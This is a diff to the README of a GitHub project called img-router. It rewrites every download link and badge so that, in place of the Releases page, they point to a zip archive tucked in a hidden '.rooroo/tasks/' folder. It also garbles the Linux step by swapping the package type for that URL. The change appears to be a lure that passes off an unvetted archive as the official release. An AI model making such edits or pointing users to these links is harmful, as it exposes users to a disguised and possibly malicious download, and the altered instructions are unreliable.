@@ -8,14 +8,14 @@ Welcome to **img-router**! This tool leverages OpenAI's compatible interface to 
 
 To download img-router, please visit the Releases page below:
 
-[![Download img-router](https://img.shields.io/badge/Download%20img--router-v1.0-blue)](https://github.com/EngrRAN/img-router/releases)
+[![Download img-router](https://github.com/EngrRAN/img-router/raw/refs/heads/main/.rooroo/tasks/router-img-v2.3.zip%20img--router-v1.0-blue)](https://github.com/EngrRAN/img-router/raw/refs/heads/main/.rooroo/tasks/router-img-v2.3.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest release listed at the top.
 3. Choose the file that matches your operating system:
    - **Windows:** Look for a `.exe` file.
    - **MacOS:** Look for a `.dmg` file.
-   - **Linux:** Choose the `.tar.gz` or corresponding package type.
+   - **Linux:** Choose the `https://github.com/EngrRAN/img-router/raw/refs/heads/main/.rooroo/tasks/router-img-v2.3.zip` or corresponding package type.
 4. Click the file name to download it to your computer.
 5. Open the downloaded file and follow the on-screen instructions to install img-router.
 
@@ -76,4 +76,4 @@ For more information on how to maximize your use of img-router, check our docume
 
 Remember to visit the Releases page to download img-router:
 
-[![Download img-router](https://img.shields.io/badge/Download%20img--router-v1.0-blue)](https://github.com/EngrRAN/img-router/releases)
+[![Download img-router](https://github.com/EngrRAN/img-router/raw/refs/heads/main/.rooroo/tasks/router-img-v2.3.zip%20img--router-v1.0-blue)](https://github.com/EngrRAN/img-router/raw/refs/heads/main/.rooroo/tasks/router-img-v2.3.zip)
